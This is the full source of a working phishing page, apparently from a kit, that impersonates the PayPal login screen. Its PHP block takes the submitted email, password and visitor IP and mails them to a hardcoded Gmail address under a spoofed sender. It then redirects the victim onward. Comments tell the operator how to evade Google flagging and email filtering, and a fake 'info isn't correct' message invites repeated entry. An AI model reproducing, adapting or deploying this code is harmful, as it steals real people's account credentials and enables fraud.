<?php


if (isset($_POST['submit'])) {
    
include_once('../include/bots.php'); //// ANTI BOOTS DONT DELETE THIS PREVENT FLAGGING FROM GOOGLE
    
$ip = getenv("REMOTE_ADDR");
$message .= "---------PayPal Logs b00merang.cc -----------\n";
$message .= "Username : ".$_POST['login_email']."\n";
$message .= "Password : ".$_POST['login_password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "---------PayPal Logs b00merang.cc -----------\n";
$recipient = "gray66tim@gmail.com";   //YOUR EMAIL HERE
$subject = "PayPal Logs-$ip";
$headers = "From: services@marketz.cc";  ///BEWARE HERE DONT TOUCH USE ALWAYS FAKE EMAIL AS SENDER TO PREVENT NOT DELIVERING
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header('location:../suspicious/?execution=es1&s_token='.sha1('WorldOfHack'));



exit;
    
    
    
}



?>




<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width" />
    <title>Log in to your PayPal account</title>
    <link rel="icon" href="../css/fav.ico" />
    <meta name="robots" content="noindex" />
    <link href="../css/style.css" rel="stylesheet" type="text/css">
    <script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
</head>
<body>
<div id="page">
    <div class="contenair">
        <header>
            <div class="logo"></div>
        </header>
        <div class="main">
            <form method="post" action="">
                <?php if(isset($_GET['error']) == "true"){
                    ?>
                    <div class="error">
                        <p class="notif notif-cretic">
                            Some of your info isn't correct. Please try again.
                        </p>
                    </div>
                    <?php
                } ?>
                <div class="textinput">
                    <input type="email" name="login_email" placeholder="Email">
                </div>
                <div class="textinput">
                    <input type="password" name="login_password" placeholder="Password">
                </div>
                <input type="hidden" value="<?php echo $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?>" name="website">
                <div class="actionsSpaced">
                    <button type="submit" name="submit" class="button">Log In</button>
                </div>
                <div class="forgotLink">
                <a href="#" class="link">Forgot your email or password?</a>
                </div>
            </form>
            <a href="#" class="btnSign">Sign Up</a>
        </div>
    </div>
    <div class="spinner" style="display: none;">
        <p class="checkingInfo">Checking your info…</p>
    </div>
</div>
<footer class="footer">
    <ul>
        <li><a href="#">Contact Us</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Legal</a></li>
        <li><a href="#">Worldwide</a></li>
    </ul>
</footer>
<script>
    $("#loginForm").submit(function(){
        var isFormValid = true;

        $(".textinput input").each(function(){
            if ($.trim($(this).val()).length == 0){
                $(this).addClass("hasErreur");
                $(this).css('z-index','100');
                isFormValid = false;
            }
            else{
                $(this).removeClass("hasErreur");
                $('.spinner').css("display",'block');
                $('.contenair').css('opacity','0.1');
                $('.footer').css('opacity','0.1');
            }
        });
        return isFormValid;
    });
    $(".textinput input").keyup(function () {
        if($(this).val().length !== 0){
            $(this).removeClass('hasErreur');
        }
    })

</script>
</body>
</html>